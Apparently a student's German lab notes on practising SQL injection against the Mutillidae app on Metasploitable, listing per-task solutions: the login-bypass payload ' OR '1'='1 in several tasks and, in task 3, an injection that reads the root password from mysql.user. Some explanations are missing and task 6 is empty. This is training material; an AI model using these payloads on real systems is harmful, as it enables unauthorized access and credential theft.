# Aufgabenstellung
Mit Metasploitable SQL-Injections üben

# Connection
Metasploitable und Kali starten und die IP Addresse von Metasploitable aufrufen.

![[Pasted image 20231019144125.png]]

# Aufgaben
Auf Mutillidae clicken und die erste Aufgabe aufmachen


Zurück zu Metasploitable wechseln und in der config.inc Datei 'metasploitable' zu 'owasp10' ändern
![[Pasted image 20231019143904.png]]
![[Pasted image 20231019144017.png]]

## Aufgabe 1

![[Pasted image 20231019144535.png]]

Lösung:
Username: admin
Password: ' OR '1'='1

![[Pasted image 20231019145654.png]]

Erklärung:
Da bei dem Passwort vergleich mit den Daten in der Datenbank fest gecoded wurde das das eingegeben Passwort in einzelnen Hochkomma geschrieben wird, kann man dies ausnutzen und eine OR Vergleich überschreiben.

## Aufgabe 2

![[Pasted image 20231019145043.png]]

Lösung:
Username: admin
Password: ' OR '1'='1

![[Pasted image 20231019145401.png]]

Erklärung:
Wie Aufgabe 1 wird hier ebenfalls im Code festgelegt das das eingegeben Passwort in einzelnen Hochkomma steht

# Aufgabe 3

![[Pasted image 20231019145315.png]]

Lösung: x','x', (select password from mysql.user where username = 'root') #
Username: 
Password: -
Confirm psw: -
Signature: -

Erklärung:


# Aufgabe 4

![[Pasted image 20231109150150.png]]

Lösung:
Username: admin
Password: ' OR '1'='1

![[Pasted image 20231109150256.png]]

Erklärung:
Wie Aufgabe 1 wird hier ebenfalls im Code festgelegt das das eingegeben Passwort in einzelnen Hochkomma steht

# Aufgabe 5

![[Pasted image 20231109150336.png]]

Lösung:
Username: admin
Password: ' OR '1'='1

![[Pasted image 20231109150501.png]]

Erklärung:
Wie Aufgabe 1 wird hier ebenfalls im Code festgelegt das das eingegeben Passwort in einzelnen Hochkomma steht.
Wenn man eingeloggt ist wird einem eine Liste von allen Usern und deren Passwörtern ausgegeben

# Aufgabe 6



